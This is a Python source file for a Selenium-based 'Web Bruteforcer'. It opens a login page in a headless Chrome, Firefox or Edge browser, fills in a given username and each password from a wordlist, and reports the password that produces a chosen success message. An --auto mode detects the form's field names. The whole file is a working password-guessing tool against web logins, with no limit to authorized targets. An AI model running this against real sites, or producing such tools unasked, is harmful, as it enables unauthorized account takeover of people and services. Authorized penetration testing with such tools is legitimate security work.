
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from colorama import Fore
import sys, os

script_name = os.path.basename(__file__)

def try_passwords(driver, username_name, password_name, username, successfulMessage, wordlist):
    found = False
    with open(wordlist, 'r') as words:
        for word in words:

            password = word.strip()

            try:
                driver.find_element(By.NAME, username_name).send_keys(username)
                driver.find_element(By.NAME, password_name).send_keys(password)
            except Exception as e:
                element_name = str(e).split('"')[8]
                print(f'{Fore.RED}[!] Error: Element not found - {element_name}{Fore.WHITE}')
                sys.exit(1)

            try:
                login_button = driver.find_element(By.XPATH, f"//input[@name='{password_name}']/following::button[@type='submit' or @type='button' or not(@type)]")
                login_button.click()
            except:
                driver.find_element(By.NAME, password_name).send_keys(Keys.RETURN)

            try:                
                WebDriverWait(driver, 2).until(lambda driver: successfulMessage in driver.page_source)
                print(f'{Fore.GREEN}[+] Login successful!')
                print(f'{Fore.GREEN}[+] Password: {password}{Fore.WHITE}')
                found = True
                break
            except:
                pass

            driver.find_element(By.NAME, username_name).clear()
            driver.find_element(By.NAME, password_name).clear()       
    if not found:
        print(f'{Fore.RED}[-] No words matched.{Fore.WHITE}')

def configure_auto(driver):

    try:
        password_field = driver.find_element(By.XPATH, "//input[@type='password']")
        password_name = password_field.get_attribute("name")
        username_field = driver.find_element(By.XPATH, "(//input[@type='password']/preceding::input[@type='text'])")
        username_name = username_field.get_attribute("name")
    except:
        print(f"{Fore.RED}[!] The value of the 'name' attribute in the form could not be found. Verify whether the login URL is correct or enter the 'name' values manually. Refer to --help for more information.{Fore.WHITE}")
        sys.exit(1)

    return username_name, password_name

def configure_driver(browser):
    match browser.lower():
        case "chrome":
            options = webdriver.ChromeOptions()
        case "firefox":
            options = webdriver.FirefoxOptions()
        case "edge":
            options = webdriver.EdgeOptions()
        case _ :
            print(f"{Fore.RED}[!] Unrecognized browser {Fore.WHITE}")
            sys.exit(1)

    options.add_argument("--headless")
    options.add_argument("--log-level=3")

    try:
        browser = getattr(webdriver, browser.capitalize())
        driver = browser(options=options)
    except AttributeError:
        print(f"{Fore.RED}[!] Unrecognized browser {Fore.WHITE}")
        sys.exit(1)

    return driver

def show_help():
    print()
    print(f"""Usage: python {script_name} <login_url> <username_name> <password_name> <username> <message> <browser> <wordlist>

    <login_url>           - URL of the login page
    <username_name>       - value of the "name" attribute for the username field in the form
    <password_name>       - value of the "name" attribute for the password field in the form
    <username>            - username to be used')
    <message>             - message expected to appear on the next page after a successful login, provided to confirm successful login
    <browser>             - browser to be used (Chrome, Firefox, or Edge)
    <wordlist>            - wordlist to be used

Web Bruteforcer can attempt to automatically discover the form\'s name attributes using the --auto command:

Usage: python {script_name} <login_url> --auto <username> <message> <browser> <wordlist>""")
    print()

if __name__ == '__main__':
    if len(sys.argv) == 8:
        url = sys.argv[1]
        username_name = sys.argv[2]
        password_name = sys.argv[3]
        username = sys.argv[4]
        message = sys.argv[5]
        browser = sys.argv[6]
        wordlist = sys.argv[7]

        driver = configure_driver(browser)
        driver.get(url)

        try_passwords(driver, username_name, password_name, username, message, wordlist)

        driver.quit()

    elif len(sys.argv) == 7 and sys.argv[2] == "--auto":

        url = sys.argv[1]
        username = sys.argv[3]
        message = sys.argv[4]
        browser = sys.argv[5]
        wordlist = sys.argv[6]

        driver = configure_driver(browser)
        driver.get(url)

        username_name, password_name = configure_auto(driver)
        try_passwords(driver, username_name, password_name, username, message, wordlist)

        driver.quit()

    elif sys.argv[1] == '--help' or sys.argv[1] == '-h':
        show_help()
    else:
        show_help()

 